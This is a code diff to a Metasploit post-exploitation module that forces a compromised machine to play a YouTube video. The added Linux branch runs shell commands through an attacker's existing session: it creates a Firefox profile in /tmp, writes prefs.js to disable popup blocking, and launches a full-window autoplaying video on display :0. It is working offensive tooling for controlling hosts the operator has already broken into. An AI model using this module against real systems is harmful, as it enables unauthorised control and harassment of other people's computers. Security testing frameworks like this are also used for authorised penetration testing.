@@ -7,6 +7,8 @@ require 'msf/core'
 
 class Metasploit3 < Msf::Post
 
+  include Msf::Post::File
+
   def initialize(info={})
     super( update_info( info,
       'Name'          => 'Multi Manage Youtube Broadcast',
@@ -17,7 +19,7 @@ class Metasploit3 < Msf::Post
       },
       'License'       => MSF_LICENSE,
       'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'win', 'osx' ],
+      'Platform'      => [ 'win', 'osx', 'linux' ],
       'SessionTypes'  => [ 'shell', 'meterpreter' ]
     ))
 
@@ -65,12 +67,43 @@ class Metasploit3 < Msf::Post
     true
   end
 
+
+  #
+  # The Linux version uses Firefox
+  #
+  def linux_start_video(id)
+    begin
+      # Create a profile
+      profile_name = "temp_profile"
+      o = cmd_exec(%Q|firefox --display :0 -CreateProfile "#{profile_name} /tmp/#{profile_name}"|)
+
+      # Add user-defined settings to profile
+      s = %Q|
+      user_pref("dom.disable_open_during_load", false);
+      user_pref("browser.shell.checkDefaultBrowser", false);
+      |
+      write_file("/tmp/#{profile_name}/prefs.js", s)
+
+      # Start the video
+      url = "https://youtube.googleapis.com/v/#{id}?fs=1&autoplay=1"
+      data_js = %Q|"data:text/html,<script>window.open('#{url}','','width:100000px;height:100000px');</script>"|
+      joe = "firefox --display :0 -p #{profile_name} #{data_js} &"
+      cmd_exec("/bin/sh -c #{joe.shellescape}")
+    rescue EOFError
+      return false
+    end
+  
+    true
+  end
+
   def start_video(id)
     case session.platform
     when /osx/
       osx_start_video(id)
     when /win/
       win_start_video(id)
+    when /linux/
+      linux_start_video(id)
     end
   end
 
